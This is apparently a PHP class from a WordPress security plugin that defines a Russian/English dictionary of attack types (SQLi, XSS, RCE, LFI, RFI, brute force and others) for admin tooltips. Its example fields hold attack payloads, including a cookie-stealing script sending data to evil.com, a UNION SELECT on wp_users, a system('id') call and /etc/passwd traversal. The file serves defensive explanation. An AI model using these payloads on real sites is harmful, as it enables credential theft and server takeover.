<?php
/**
 * Attack Types Dictionary.
 *
 * Central registry of attack types used across the plugin with:
 *  - human-readable label (RU/EN)
 *  - short description (shown in tooltips)
 *  - detailed explanation
 *  - severity (critical / high / medium / low / info)
 *  - icon (dashicon name)
 *  - color (hex)
 *
 * @package RybinskLabSecurity
 */

if ( ! defined( 'ABSPATH' ) ) {
    exit;
}

class RLS_Attack_Types {

    /**
     * Master dictionary. The 'key' is the value stored in rls_attack_log.type.
     */
    public static function all() {
        return [
            'waf' => [
                'key'         => 'waf',
                'label'       => 'WAF',
                'label_en'    => 'WAF Rule',
                'severity'    => 'high',
                'color'       => '#dc2626',
                'icon'        => 'dashicons-shield',
                'short'       => 'Срабатывание правила Web Application Firewall.',
                'description' => 'Сработало одно из правил WAF (Web Application Firewall). Это сигнатурная защита от типовых веб-атак: SQL-инъекций, XSS, попыток обхода путей, выполнения команд. Каждое правило — это паттерн в URI, headers или теле запроса, который заблокирован на уровне edge.',
                'attack_vector' => 'HTTP запрос (GET/POST), URI, headers, body.',
                'real_example' => 'GET /wp-admin/admin-ajax.php?action=foo&param=1 UNION SELECT * FROM wp_users',
                'how_to_respond' => 'Проверьте IP, заблокируйте навсегда. Если правило ложное — добавьте в whitelist.',
            ],
            'sqli' => [
                'key'         => 'sqli',
                'label'       => 'SQL Injection',
                'label_en'    => 'SQL Injection',
                'severity'    => 'critical',
                'color'       => '#dc2626',
                'icon'        => 'dashicons-database',
                'short'       => 'Попытка внедрить SQL-код через параметры запроса.',
                'description' => 'Атака направлена на извлечение или модификацию данных в БД. Типичные приёмы: UNION SELECT, OR 1=1, time-based blind, stacked queries. WordPress и плагины защищены через $wpdb->prepare(), но новые уязвимости обнаруживаются регулярно.',
                'attack_vector' => '$_GET, $_POST, $_COOKIE, HTTP headers.',
                'real_example' => 'id=-1\' UNION SELECT user_login, user_pass FROM wp_users--',
                'how_to_respond' => 'Блокируйте IP. Если у вас старая версия WP или плагина — обновите. Добавьте в мониторинг.',
            ],
            'xss' => [
                'key'         => 'xss',
                'label'       => 'XSS',
                'label_en'    => 'Cross-Site Scripting',
                'severity'    => 'critical',
                'color'       => '#dc2626',
                'icon'        => 'dashicons-warning',
                'short'       => 'Попытка внедрить JavaScript в страницу.',
                'description' => 'Атакующий пытается выполнить JS в браузере жертвы через недостаточную фильтрацию пользовательского ввода. Может привести к краже cookies, перехвату сессии, defacement. WordPress фильтрует через esc_html() / wp_kses(), но плагины могут ошибаться.',
                'attack_vector' => 'Комментарии, формы поиска, custom fields, URL-параметры.',
                'real_example' => '<script>fetch(\'https://evil.com/?c=\'+document.cookie)</script>',
                'how_to_respond' => 'Заблокируйте IP. Убедитесь, что все echo/print используют esc_html().',
            ],
            'rce' => [
                'key'         => 'rce',
                'label'       => 'RCE',
                'label_en'    => 'Remote Code Execution',
                'severity'    => 'critical',
                'color'       => '#dc2626',
                'icon'        => 'dashicons-editor-code',
                'short'       => 'Удалённое выполнение кода на сервере.',
                'description' => 'Самая опасная категория. Атакующий пытается выполнить произвольный PHP-код, системные команды или загрузить веб-шелл. Обычно через уязвимости в плагинах (TimThumb, File Manager, Duplicator и др.). Заражение = полный контроль над сервером.',
                'attack_vector' => 'eval(), system(), exec(), passthru(), file_put_contents() через параметры.',
                'real_example' => '?cmd=system(\'id\'); или upload shell.php через плагин',
                'how_to_respond' => 'Срочно заблокируйте IP. Проверьте сайт на следы: веб-шелл, новые админ-аккаунты, изменения в wp-config.php. Сделайте аудит всех плагинов и тем.',
            ],
            'lfi' => [
                'key'         => 'lfi',
                'label'       => 'LFI / Path Traversal',
                'label_en'    => 'Local File Inclusion',
                'severity'    => 'critical',
                'color'       => '#dc2626',
                'icon'        => 'dashicons-open-folder',
                'short'       => 'Попытка прочитать локальные файлы сервера.',
                'description' => 'Через ../ или абсолютные пути атакующий пытается прочитать /etc/passwd, wp-config.php, .env. Часто комбинируется с RCE: LFI → чтение секретов → RCE через утечку credentials.',
                'attack_vector' => 'Параметры include/file/template в URL или POST.',
                'real_example' => '?file=../../../../etc/passwd или ?page=....//wp-config.php',
                'how_to_respond' => 'Блокируйте IP. Аудит кода на использование include()/require() с пользовательским вводом.',
            ],
            'rfi' => [
                'key'         => 'rfi',
                'label'       => 'RFI',
                'label_en'    => 'Remote File Inclusion',
                'severity'    => 'critical',
                'color'       => '#dc2626',
                'icon'        => 'dashicons-cloud-upload',
                'short'       => 'Подключение удалённого файла как PHP-кода.',
                'description' => 'Атакующий загружает свой PHP-файл на свой сервер и через параметр include заставляет ваш сайт его выполнить. allow_url_include в php.ini должен быть Off, но многие хостинги оставляют его On.',
                'attack_vector' => '?page=http://evil.com/shell.php',
                'real_example' => 'GET /?template=http://attacker.com/x.txt',
                'how_to_respond' => 'Срочно: отключите allow_url_include в php.ini. Проверьте на следы заражения.',
            ],
            'brute' => [
                'key'         => 'brute',
                'label'       => 'Brute Force',
                'label_en'    => 'Brute Force Login',
                'severity'    => 'high',
                'color'       => '#d97706',
                'icon'        => 'dashicons-lock',
                'short'       => 'Перебор паролей администратора.',
                'description' => 'Атакующий делает множество попыток входа с разными паролями. WordPress сам по себе не защищён от брутфорса — для этого нужен плагин типа нашего. Типичная атака: 1000 попыток admin/123456, admin/password и т.д.',
                'attack_vector' => 'POST /wp-login.php с admin/пароль.',
                'real_example' => 'POST /wp-login.php (admin / password123)',
                'how_to_respond' => 'Включите 2FA. Заблокируйте IP после N попыток. Используйте нестандартный логин админа.',
            ],
            'bot' => [
                'key'         => 'bot',
                'label'       => 'Bad Bot',
                'label_en'    => 'Malicious Bot',
                'severity'    => 'medium',
                'color'       => '#0284c7',
                'icon'        => 'dashicons-admin-generic',
                'short'       => 'Вредоносный бот (сканер, парсер, спамер).',
                'description' => 'Бот, который нарушает robots.txt, маскируется под обычный браузер, пытается сканировать уязвимости, собирать email-адреса, парсить контент. Примеры: AhrefsBot, SemrushBot (полезные), MJ12bot, DotBot (спорные), и явный malware типа Nmap-scripted bots.',
                'attack_vector' => 'HTTP User-Agent, сканирование типовых путей (wp-login.php, xmlrpc.php).',
                'real_example' => 'User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine)',
                'how_to_respond' => 'Заблокируйте User-Agent в robots.txt + .htaccess. Добавьте в blacklist.',
            ],
            'spam' => [
                'key'         => 'spam',
                'label'       => 'Spam',
                'label_en'    => 'Spam / Comment Spam',
                'severity'    => 'low',
                'color'       => '#7c3aed',
                'icon'        => 'dashicons-email',
                'short'       => 'Спам в комментариях, формах, регистрациях.',
                'description' => 'Массовая отправка рекламных сообщений через формы комментариев, регистрации, контактные формы. Обычно с рекламой лекарств, казино, ссылок на вредоносные сайты.',
                'attack_vector' => 'POST /wp-comments-post.php с типичными спам-фразами.',
                'real_example' => 'comment=Buy cheap viagra online!!!',
                'how_to_respond' => 'Активируйте антиспам (hCaptcha, Akismet). Закройте комментарии если не нужны.',
            ],
            'geo' => [
                'key'         => 'geo',
                'label'       => 'Geo-block',
                'label_en'    => 'GeoIP Block',
                'severity'    => 'info',
                'color'       => '#0e7490',
                'icon'        => 'dashicons-admin-site',
                'short'       => 'Запрос заблокирован по геолокации.',
                'description' => 'IP принадлежит стране из вашего blacklist. Обычно не признак атаки, а проявление геополитической защиты. Если атаки идут массово из конкретной страны — добавьте её в blacklist.',
                'attack_vector' => 'Любой запрос с IP из заблокированной страны.',
                'real_example' => 'GET / (IP из CN + вы в blacklist)',
                'how_to_respond' => 'Если не нужны клиенты из этой страны — оставьте. Если нужны — добавьте IP в whitelist.',
            ],
            'blacklist' => [
                'key'         => 'blacklist',
                'label'       => 'Blacklist Hit',
                'label_en'    => 'IP in Blacklist',
                'severity'    => 'high',
                'color'       => '#7c2d12',
                'icon'        => 'dashicons-dismiss',
                'short'       => 'IP в вашем ручном blacklist.',
                'description' => 'IP добавлен в ваш blacklist вручную (после предыдущей атаки) или автоматически из облачной базы угроз. Любой запрос с такого IP блокируется немедленно.',
                'attack_vector' => 'Любой запрос от IP из blacklist.',
                'real_example' => 'GET / (IP в rls_manual_blacklist)',
                'how_to_respond' => 'Если это ваш IP — добавьте в whitelist. Если нет — это либо известный атакующий, либо скомпрометированный IP.',
            ],
            'manual' => [
                'key'         => 'manual',
                'label_en'    => 'Manual Block',
                'label'       => 'Ручная блокировка',
                'severity'    => 'medium',
                'color'       => '#4b5563',
                'icon'        => 'dashicons-admin-tools',
                'short'       => 'IP заблокирован вручную администратором.',
                'description' => 'Вы сами добавили этот IP в blacklist. Обычно после обнаружения подозрительной активности.',
                'attack_vector' => 'Любой запрос.',
                'real_example' => 'GET / (IP manually blocked via admin panel)',
                'how_to_respond' => 'Если блокировка нужна — ничего не делайте. Если IP ошибочный — удалите из blacklist.',
            ],
            'language' => [
                'key'         => 'language',
                'label'       => 'Language Filter',
                'label_en'    => 'Language Filter',
                'severity'    => 'low',
                'color'       => '#0e7490',
                'icon'        => 'dashicons-translation',
                'short'       => 'Запрос заблокирован по Accept-Language.',
                'description' => 'Заголовок Accept-Language не соответствует вашему списку разрешённых. Боты часто используют en-US для сканирования любых сайтов, независимо от языка.',
                'attack_vector' => 'HTTP Accept-Language header.',
                'real_example' => 'Accept-Language: en-US (фильтр настроен на ru, uk)',
                'how_to_respond' => 'Если ваш сайт международный — добавьте языки в whitelist. Если только русский — игнорируйте.',
            ],
            'xmlrpc' => [
                'key'         => 'xmlrpc',
                'label'       => 'XML-RPC',
                'label_en'    => 'XML-RPC Abuse',
                'severity'    => 'medium',
                'color'       => '#0e7490',
                'icon'        => 'dashicons-rss',
                'short'       => 'Злоупотребление XML-RPC.',
                'description' => 'WordPress XML-RPC (xmlrpc.php) — это старая технология для удалённого управления. Часто используется для brute force (multicall позволяет проверять много credentials в одном запросе) и DDoS amplification. Рекомендуется отключать, если не используется Jetpack.',
                'attack_vector' => 'POST /xmlrpc.php с system.multicall.',
                'real_example' => 'POST /xmlrpc.php с <methodCall>system.multicall...</methodCall>',
                'how_to_respond' => 'Отключите XML-RPC: добавьте add_filter(\'xmlrpc_enabled\', \'__return_false\'); или используйте плагин Disable XML-RPC.',
            ],
            '404' => [
                'key'         => '404',
                'label'       => '404 Probing',
                'label_en'    => '404 Probing',
                'severity'    => 'low',
                'color'       => '#9ca3af',
                'icon'        => 'dashicons-warning',
                'short'       => 'Массовые 404 на несуществующих путях.',
                'description' => 'Бот перебирает пути на сервере: /admin.php, /backup.zip, /.git/config. Это reconnaissance перед атакой. Если 404 много — бот готовится к чему-то конкретному.',
                'attack_vector' => 'GET на типичные пути для сканирования.',
                'real_example' => 'GET /.env /admin.php /backup.sql',
                'how_to_respond' => 'Заблокируйте IP. Проверьте, нет ли реальных файлов с этими именами.',
            ],
            'flood' => [
                'key'         => 'flood',
                'label'       => 'HTTP Flood',
                'label_en'    => 'HTTP Flood / DoS',
                'severity'    => 'high',
                'color'       => '#ea580c',
                'icon'        => 'dashicons-dashboard',
                'short'       => 'Аномально много запросов с одного IP.',
                'description' => 'Запросы идут с частотой, которая не может быть от человека. Цель — DDoS (исчерпание ресурсов), замедление сайта, или отвлечение внимания от другой атаки.',
                'attack_vector' => 'Массовые GET/POST с одного IP за короткое время.',
                'real_example' => '1000+ GET / за 60 секунд с одного IP',
                'how_to_respond' => 'Включите rate limiting. Используйте CDN (Cloudflare). Блокируйте IP.',
            ],
            'scan' => [
                'key'         => 'scan',
                'label'       => 'Recon Scan',
                'label_en'    => 'Reconnaissance',
                'severity'    => 'medium',
                'color'       => '#0284c7',
                'icon'        => 'dashicons-search',
                'short'       => 'Сканирование уязвимостей.',
                'description' => 'Бот использует типичные сканеры (Nikto, WPScan, Nuclei) для обнаружения известных уязвимостей. Сканирует плагины, темы, версии, известные CVE. Это первый этап перед реальной атакой.',
                'attack_vector' => 'GET на пути известных уязвимостей.',
                'real_example' => 'GET /wp-content/plugins/duplicator/readme.txt',
                'how_to_respond' => 'Заблокируйте IP. Обновите все плагины/темы до последних версий.',
            ],
            'fail2ban' => [
                'key'         => 'fail2ban',
                'label'       => 'Fail2Ban-style',
                'label_en'    => 'Brute Force (auto-ban)',
                'severity'    => 'high',
                'color'       => '#ea580c',
                'icon'        => 'dashicons-lock',
                'short'       => 'Автоблокировка после N неудачных попыток.',
                'description' => 'IP превысил лимит неудачных попыток входа и автоматически заблокирован нашей системой brute-force protection. Обычно это бот, перебирающий пароли.',
                'attack_vector' => 'POST /wp-login.php много раз подряд.',
                'real_example' => 'IP заблокирован после 5 неудачных попыток за 10 минут',
                'how_to_respond' => 'Блокировка автоматическая. Если это ваш IP — добавьте в whitelist.',
            ],
            'unknown' => [
                'key'         => 'unknown',
                'label'       => 'Прочее',
                'label_en'    => 'Unknown',
                'severity'    => 'low',
                'color'       => '#6b7280',
                'icon'        => 'dashicons-marker',
                'short'       => 'Тип не определён.',
                'description' => 'Событие зафиксировано, но не классифицировано по известным типам. Это может быть новый тип атаки или false positive.',
                'attack_vector' => 'Любой.',
                'real_example' => 'Событие без явной сигнатуры',
                'how_to_respond' => 'Проверьте reason. Если подозрительно — добавьте правило в WAF.',
            ],
        ];
    }

    public static function get( $key ) {
        $all = self::all();
        return $all[ strtolower( (string) $key ) ] ?? $all['unknown'];
    }

    public static function get_label( $key ) {
        $t = self::get( $key );
        return $t['label'];
    }

    public static function get_label_en( $key ) {
        $t = self::get( $key );
        return $t['label_en'];
    }

    public static function get_short( $key ) {
        $t = self::get( $key );
        return $t['short'];
    }

    public static function get_description( $key ) {
        $t = self::get( $key );
        return $t['description'];
    }

    public static function get_color( $key ) {
        $t = self::get( $key );
        return $t['color'];
    }

    public static function get_severity( $key ) {
        $t = self::get( $key );
        return $t['severity'];
    }

    public static function get_icon( $key ) {
        $t = self::get( $key );
        return $t['icon'];
    }

    /**
     * Renders an attack type badge with hover tooltip.
     */
    public static function render_badge( $key, $compact = false ) {
        $t = self::get( $key );
        $severity = $t['severity'];
        $color = $t['color'];
        $icon = $t['icon'];
        $label = $t['label'];
        $short = esc_attr( $t['short'] );
        $long = esc_attr( $t['description'] );
        $vector = esc_attr( $t['attack_vector'] );
        $example = esc_attr( $t['real_example'] );
        $response = esc_attr( $t['how_to_respond'] );

        $tooltip_html = '<div class=\"rls-attack-tooltip\">';
        $tooltip_html .= '<div class=\"rls-attack-tooltip__title\">';
        $tooltip_html .= '<span class=\"dashicons ' . esc_attr( $icon ) . '\"></span>';
        $tooltip_html .= '<strong>' . esc_html( $label ) . ' <small>(' . esc_html( $t['label_en'] ) . ')</small></strong>';
        $tooltip_html .= '<span class=\"rls-badge-log ' . esc_attr( $severity ) . '\">' . esc_html( strtoupper( $severity ) ) . '</span>';
        $tooltip_html .= '</div>';
        $tooltip_html .= '<p class=\"rls-attack-tooltip__desc\">' . esc_html( $long ) . '</p>';
        if ( ! $compact ) {
            $tooltip_html .= '<div class=\"rls-attack-tooltip__row\"><strong>Вектор:</strong> ' . esc_html( $vector ) . '</div>';
            $tooltip_html .= '<div class=\"rls-attack-tooltip__row\"><strong>Пример:</strong> <code>' . esc_html( $example ) . '</code></div>';
            $tooltip_html .= '<div class=\"rls-attack-tooltip__row\"><strong>Что делать:</strong> ' . esc_html( $response ) . '</div>';
        }
        $tooltip_html .= '</div>';

        $inline_tooltip = "data-rls-attack-type=\"" . esc_attr( strtolower( $key ) ) . "\" data-rls-tooltip-html='" . esc_attr( $tooltip_html ) . "'";

        return sprintf(
            '<span class="rls-attack-badge rls-attack-badge--%s" %s style="background:%s;color:#fff;">' .
                '<span class="dashicons %s"></span>' .
                '<span>%s</span>' .
            '</span>',
            esc_attr( $severity ),
            $inline_tooltip,
            esc_attr( $color ),
            esc_attr( $icon ),
            esc_html( $label )
        );
    }

    /**
     * Returns the list of all attack types for use in selectors.
     */
    public static function get_all_for_select() {
        $out = [];
        foreach ( self::all() as $key => $t ) {
            $out[ $key ] = $t['label'] . ' (' . $t['label_en'] . ')';
        }
        return $out;
    }
}
